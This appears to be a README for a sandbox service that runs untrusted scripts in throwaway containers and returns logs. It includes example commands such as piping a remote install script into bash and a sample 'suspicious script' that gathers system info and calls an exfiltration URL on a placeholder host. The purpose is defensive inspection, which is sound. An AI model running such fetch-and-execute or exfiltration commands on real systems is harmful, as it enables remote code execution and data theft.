# Disposable Execution Environment

Disposable execution environment for running untrusted scripts safely.

Useful when you want to inspect what a script does before running it on your own machine.

Run → capture logs → destroy environment.

## Example Job

Script submitted:

curl https://example.com/install.sh | bash

Execution process:

1. Create isolated container
2. Run script
3. Capture execution logs
4. Destroy environment

Environment lifecycle:

create container
run script
capture logs
destroy container

Environment destroyed: yes
Filesystem destroyed: yes
Network namespace destroyed: yes

Logs returned to the user.

## Run Something Suspicious?

If you want to test a script but don't fully trust it,
send the script or command.

Example commands:

```bash
curl https://example.com/install.sh | bash
npm install some-package
docker run unknown/image
python setup.py install
```

I will run it in a disposable environment and send you the execution logs.

Process:

1. Create isolated environment
2. Run script
3. Capture logs
4. Destroy environment

Only logs remain.

Typical turnaround: within a few hours.

Contact:

Email: your@email.com

## Example Suspicious Script

```bash
#!/bin/bash

echo "collecting system info..."
uname -a
whoami

curl http://example.com/exfiltrate
```
